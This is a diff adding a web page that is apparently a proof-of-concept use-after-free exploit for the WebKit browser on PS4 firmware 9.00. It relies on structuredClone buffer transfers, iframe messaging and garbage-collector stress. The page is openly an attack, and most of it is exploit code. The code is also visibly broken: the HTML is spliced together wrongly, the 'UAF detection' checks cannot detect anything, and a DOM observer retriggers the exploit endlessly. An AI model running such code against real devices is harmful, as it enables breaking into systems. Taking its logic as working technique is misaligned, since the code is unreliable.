@@ -116,4 +116,117 @@
         });
     </script>
 </body>
+</html> UAF PoC (PS4 9.00)</title>
+    <style>
+        #trigger {
+            margin: 20px 0;
+            padding: 12px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        #status {
+            margin-top: 10px;
+            font-weight: bold;
+            color: darkgreen;
+        }
+        #container {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>WebKit CloneDeserializer UAF PoC (PS4 9.00)</h1>
+    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
+    <button id="trigger">Trigger PoC</button>
+    <div id="status">Idle...</div>
+    <div id="container"></div>
+    <script type="module">
+        import { debug_log } from './module/utils.mjs';
+
+        const container = document.getElementById('container');
+        const status = document.getElementById('status');
+        let attemptCount = 0;
+
+        function stressGC() {
+            debug_log('Stressing GC...');
+            for (let i = 0; i < 300; i++) {
+                new ArrayBuffer(1024 * 1024);
+            }
+            debug_log('GC stress completed.');
+        }
+
+        function triggerExploit() {
+            attemptCount++;
+            debug_log(`Attempt ${attemptCount}: Initiating...`);
+            status.textContent = `Attempt ${attemptCount} in progress...`;
+
+            try {
+                debug_log('Creating complex object...');
+                const arrayBuffer = new ArrayBuffer(2048);
+                const messagePort = new MessageChannel().port1;
+                const complexObject = {
+                    buffer: arrayBuffer,
+                    array: new Uint8Array(500),
+                    nested: { x: new ArrayBuffer(256) }
+                };
+
+                debug_log('Creating iframe...');
+                const iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+                const iframeWindow = iframe.contentWindow;
+
+                debug_log('Posting message...');
+                iframeWindow.postMessage(structuredClone(complexObject, {
+                    transfer: [arrayBuffer, messagePort]
+                }), '*');
+
+                setTimeout(() => {
+                    debug_log('Checking memory after postMessage...');
+                    const testBuf = new Uint8Array(4096);
+                    testBuf.fill(0x46);
+                    if (testBuf[0] !== 0x46) {
+                        debug_log('Early UAF detected!');
+                        status.textContent = 'Early UAF detected!';
+                        return;
+                    }
+                    debug_log('Second memory check...');
+                    const testBuf2 = new Uint8Array(4096);
+                    testBuf2.fill(0x47);
+                    if (testBuf2[0] !== 0x47) {
+                        debug_log('Second UAF detected!');
+                        status.textContent = 'Second UAF detected!';
+                        return;
+                    }
+                    stressGC();
+                    debug_log('Exploit completed (no heap spray).');
+                    status.textContent = 'Exploit attempted (no heap spray)!';
+                    container.removeChild(iframe);
+                }, 150);
+            } catch (err) {
+                console.error(`Error: ${err.message}`);
+                status.textContent = 'Failed: Error occurred.';
+            }
+        }
+
+        const observer = new MutationObserver(() => {
+            debug_log('DOM changed, retrying...');
+            triggerExploit();
+        });
+
+        observer.observe(container, { childList: true, subtree: true });
+
+        document.getElementById('trigger').addEventListener('click', () => {
+            try {
+                triggerExploit();
+            } catch (err) {
+                console.error(`Error: ${err.message}`);
+                status.textContent = 'Failed: Error occurred.';
+            }
+        });
+
+        window.addEventListener('message', (event) => {
+            debug_log('Message received:', event.data);
+        });
+    </script>
+</body>
 </html>
